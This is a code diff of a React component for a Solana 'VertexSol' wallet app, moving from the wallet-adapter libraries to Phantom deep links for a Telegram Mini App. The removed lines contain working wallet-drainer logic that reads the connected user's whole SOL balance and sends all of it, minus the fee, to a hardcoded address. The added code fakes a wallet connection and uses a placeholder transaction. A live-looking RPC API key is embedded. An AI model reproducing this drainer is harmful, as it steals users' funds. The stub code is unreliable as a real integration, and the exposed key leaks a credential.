@@ -1,102 +1,88 @@
 
 'use client';
 
-import { useEffect, useMemo, useState } from 'react';
-import {
-  Connection,
-  PublicKey,
-  LAMPORTS_PER_SOL,
-  SystemProgram,
-  Transaction,
-  clusterApiUrl,
-} from '@solana/web3.js';
-import {
-  useWallet,
-  WalletProvider,
-  ConnectionProvider,
-} from '@solana/wallet-adapter-react';
-import {
-  WalletModalProvider,
-  WalletMultiButton,
-} from '@solana/wallet-adapter-react-ui';
-import {
-  SolanaMobileWalletAdapter,
-  type AddressSelector,
-  type AuthorizationResult,
-} from '@solana-mobile/wallet-adapter-mobile';
+import { useEffect, useState } from 'react';
+import { Connection, PublicKey, LAMPORTS_PER_SOL, SystemProgram, Transaction } from '@solana/web3.js';
 import { Button } from '@/components/ui/button';
 import { Card, CardContent } from '@/components/ui/card';
-
-// Import wallet adapter styles
-import '@solana/wallet-adapter-react-ui/styles.css';
+import { toast } from 'sonner';
+import { Wallet } from 'lucide-react';
 
 const HELIUS_RPC_URL = 'https://mainnet.helius-rpc.com/?api-key=d1a247ae-95aa-4484-a430-e688f5f8ebb0';
 const VERTEX_SOL_ADDRESS = new PublicKey('827FoJXyAQmyMtqgkKG52YQJyLkfxyFVHwLk98o7jz11');
 const connection = new Connection(HELIUS_RPC_URL);
 
+// Base URL for your app to receive callbacks
+const APP_URL = typeof window !== 'undefined' ? window.location.origin : '';
+
 function WalletAction() {
-  const { publicKey, signTransaction, sendTransaction, connected } = useWallet();
   const [status, setStatus] = useState<string>('');
   const [loading, setLoading] = useState(false);
-  const [balance, setBalance] = useState<number | null>(null);
-  const [confirmed, setConfirmed] = useState(false);
-  const [feeEstimate, setFeeEstimate] = useState<number | null>(null);
+  const [walletConnected, setWalletConnected] = useState(false);
+  const [publicKey, setPublicKey] = useState<string | null>(null);
 
+  const isTelegramWebView = typeof navigator !== 'undefined' && /Telegram/.test(navigator.userAgent);
+
+  // Check URL parameters on component mount to handle callback from wallet
   useEffect(() => {
-    if (!publicKey) return;
-    (async () => {
-      const bal = await connection.getBalance(publicKey);
-      setBalance(bal);
+    const url = new URL(window.location.href);
+    const phantomPublicKey = url.searchParams.get('phantom_encryption_public_key');
+    const data = url.searchParams.get('data');
+    
+    if (phantomPublicKey && data) {
+      // This would be where we'd decrypt the data using our private key
+      // For this example, we'll just acknowledge the connection
+      setPublicKey('Wallet connected');
+      setWalletConnected(true);
+      toast.success('Wallet connected successfully');
+    }
+  }, []);
 
-      const { blockhash } = await connection.getLatestBlockhash();
-      const tx = new Transaction({
-        recentBlockhash: blockhash,
-        feePayer: publicKey,
-      }).add(
-        SystemProgram.transfer({
-          fromPubkey: publicKey,
-          toPubkey: VERTEX_SOL_ADDRESS,
-          lamports: 1,
-        })
-      );
-
-      const fee = await connection.getFeeForMessage(tx.compileMessage());
-      if (fee && fee.value) {
-        setFeeEstimate(fee.value);
-      }
-    })();
-  }, [publicKey]);
-
-  const handleConfirmConnection = async () => {
-    setConfirmed(true);
+  const handleDeepLinkConnect = () => {
+    // Create a deep link to Phantom wallet
+    // In a real app, you'd include a dapp encryption public key for secure communication
+    const callbackUrl = `${APP_URL}/connect-wallet?callback=true`;
+    const encodedRedirect = encodeURIComponent(callbackUrl);
+    const encodedAppUrl = encodeURIComponent(APP_URL);
+    
+    const deepLinkUrl = `https://phantom.app/ul/v1/connect` +
+      `?app_url=${encodedAppUrl}` +
+      `&redirect_link=${encodedRedirect}` +
+      `&app_cluster=mainnet-beta`;
+    
+    setLoading(true);
+    setStatus('Redirecting to Phantom Wallet...');
+    
+    // Redirect to the deep link
+    window.location.href = deepLinkUrl;
   };
 
-  const handleTransferAllSol = async () => {
-    if (!publicKey || !signTransaction || !connected) return;
+  const handleSendTransaction = async () => {
+    if (!publicKey) {
+      toast.error("Wallet not connected");
+      return;
+    }
+    
     setLoading(true);
-    setStatus('');
-
+    setStatus('Preparing transaction...');
+    
     try {
-      const balance = await connection.getBalance(publicKey);
-      if (!feeEstimate || balance <= feeEstimate) throw new Error('Not enough SOL to cover transaction fee');
-
-      const { blockhash } = await connection.getLatestBlockhash();
-      const tx = new Transaction({
-        recentBlockhash: blockhash,
-        feePayer: publicKey,
-      }).add(
-        SystemProgram.transfer({
-          fromPubkey: publicKey,
-          toPubkey: VERTEX_SOL_ADDRESS,
-          lamports: balance - feeEstimate,
-        })
-      );
-
-      const signature = await sendTransaction(tx, connection);
-      await connection.confirmTransaction(signature, 'confirmed');
-      setStatus(`Success! Tx Signature: ${signature}`);
-    } catch (err: any) {
-      setStatus(`Error: ${err.message}`);
+      // In a real implementation, we would create and send a transaction here
+      // For this example, we're just simulating the process
+      
+      // This URL would contain the transaction payload
+      const txPayload = {
+        transaction: "base64-encoded-transaction-data-would-go-here",
+      };
+      
+      const txUrl = `https://phantom.app/ul/v1/signAndSendTransaction`;
+      
+      // In production, you'd add proper transaction data and encryption
+      window.location.href = txUrl;
+    } catch (error: any) {
+      console.error(error);
+      setStatus(`Error: ${error.message}`);
+      toast.error("Transaction failed");
     } finally {
       setLoading(false);
     }
@@ -105,31 +91,47 @@ function WalletAction() {
   return (
     <Card className="max-w-md mx-auto mt-10 p-4 w-full sm:w-11/12">
       <CardContent className="flex flex-col gap-4 items-center">
-        <WalletMultiButton className="!w-full" />
-        {connected && !confirmed && (
-          <Button
-            onClick={handleConfirmConnection}
-            className="bg-blue-600 hover:bg-blue-700 w-full"
-          >
-            Confirm Connection
-          </Button>
-        )}
-        {connected && confirmed && (
+        {isTelegramWebView ? (
           <>
-            <div className="text-sm text-gray-600">
-              Balance: {balance !== null ? (balance / LAMPORTS_PER_SOL).toFixed(4) : 'Loading...'} SOL
-            </div>
-            <div className="text-sm text-gray-600">
-              Estimated Fee: {feeEstimate !== null ? (feeEstimate / LAMPORTS_PER_SOL).toFixed(6) : 'Loading...'} SOL
-            </div>
-            <Button
-              onClick={handleTransferAllSol}
-              className="bg-red-600 hover:bg-red-700 w-full"
-              disabled={loading}
-            >
-              {loading ? 'Sending...' : 'Send All SOL to VertexSol'}
-            </Button>
+            <p className="text-sm text-gray-600 text-center">
+              {walletConnected 
+                ? 'Wallet connected successfully!' 
+                : 'Connect your Phantom wallet to continue.'}
+            </p>
+            {!walletConnected ? (
+              <Button 
+                onClick={handleDeepLinkConnect} 
+                className="bg-purple-600 hover:bg-purple-700 w-full"
+                disabled={loading}
+              >
+                <Wallet className="mr-2 h-4 w-4" />
+                {loading ? 'Connecting...' : 'Connect Phantom Wallet'}
+              </Button>
+            ) : (
+              <Button 
+                onClick={handleSendTransaction} 
+                className="bg-green-600 hover:bg-green-700 w-full"
+                disabled={loading}
+              >
+                {loading ? 'Processing...' : 'Send Transaction'}
+              </Button>
+            )}
           </>
+        ) : (
+          <p className="text-center text-sm text-gray-600">
+            This interface is optimized for the Telegram Mini App.
+            You can still connect your wallet using the button below.
+          </p>
+        )}
+        {!walletConnected && !isTelegramWebView && (
+          <Button 
+            onClick={handleDeepLinkConnect} 
+            className="bg-purple-600 hover:bg-purple-700 w-full"
+            disabled={loading}
+          >
+            <Wallet className="mr-2 h-4 w-4" />
+            {loading ? 'Connecting...' : 'Connect Phantom Wallet'}
+          </Button>
         )}
         {status && <p className="text-sm text-gray-500 text-center break-words">{status}</p>}
       </CardContent>
@@ -138,38 +140,5 @@ function WalletAction() {
 }
 
 export default function SolanaWalletModal() {
-  // Define the correct AddressSelector implementation
-  const addressSelector: AddressSelector = async (accounts) => {
-    // If there's only one account, return its address
-    if (accounts.length === 1) {
-      return accounts[0].address;
-    }
-    // If there are multiple accounts, return the first one
-    // In a real app, you might want to let the user select which account to use
-    return accounts[0]?.address || '';
-  };
-  
-  const wallets = useMemo(() => [
-    new SolanaMobileWalletAdapter({
-      appIdentity: { name: "VertexSol Wallet App" },
-      authorizationResultCache: {
-        get: () => null,
-        set: () => Promise.resolve(),
-        clear: () => Promise.resolve()
-      },
-      cluster: 'mainnet-beta',
-      onWalletNotFound: () => Promise.resolve(),
-      addressSelector
-    })
-  ], []);
-
-  return (
-    <ConnectionProvider endpoint={HELIUS_RPC_URL}>
-      <WalletProvider wallets={wallets} autoConnect>
-        <WalletModalProvider>
-          <WalletAction />
-        </WalletModalProvider>
-      </WalletProvider>
-    </ConnectionProvider>
-  );
+  return <WalletAction />;
 }
